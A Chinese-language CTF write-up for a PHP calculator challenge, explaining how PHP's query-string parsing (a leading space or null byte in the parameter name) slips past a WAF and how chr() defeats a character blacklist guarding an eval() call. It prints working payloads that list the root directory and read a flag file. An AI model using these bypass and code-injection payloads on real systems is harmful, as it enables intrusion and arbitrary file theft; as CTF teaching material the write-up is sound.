CTF

前置知识点

  1. php字符串解析特性 PHP会将查询字符串（在URL或正文中）转换为内部关联数组$_GET或关联数组$_POST,例如会将 /?foo=bar变成Array([foo] => “bar”)。

    然而查询字符串在解析的过程中会将某些字符删除或用下划线代替，如/?%20news[id%00=42会转换为Array([news_id] => 42)。

    如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：/news.php?%20news[id%00=42"+AND+1=0–这句话的意思就是$_GET["news_id"]=42"+AND+1=0-

    User_Input Decode_PHP variable name
    %20foo_bar%00 foo_bar foo_bar
    foo%20bar%00 foo bar foo bar
    foo%5bbar foo[bar foo_bar

  2. 使用chr()函数绕过匹配

num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))

题目

打开题目，F12查看源代码 

<!--I've set up WAF to ensure security.-->
    $('#calc').submit(function(){
        $.ajax({
            url:"calc.php?num="+encodeURIComponent($("#content").val()),
            type:'GET',
            success:function(data){
                $("#result").html(`<div class="alert alert-success">
            <strong>答案:</strong>${data}
            </div>`);
            },
            error:function(){
                alert("这啥?算不来!");
            }
        })
        return false;
    })
发现有calc.php文件并且网页开启了WAF。 打开calc.php 文件，查看源代码 
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?>
发现了过滤机制，虽然WAF防御了num变量，但是并没有防御%20num,于是可以使用空格绕过WAF，然后使用eval执行命令。使用chr()函数绕过黑名单，使用var_dump(scandir(chr(47)))查看数组，发现存在f1agg文件，构造payload=num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))即找到flag。
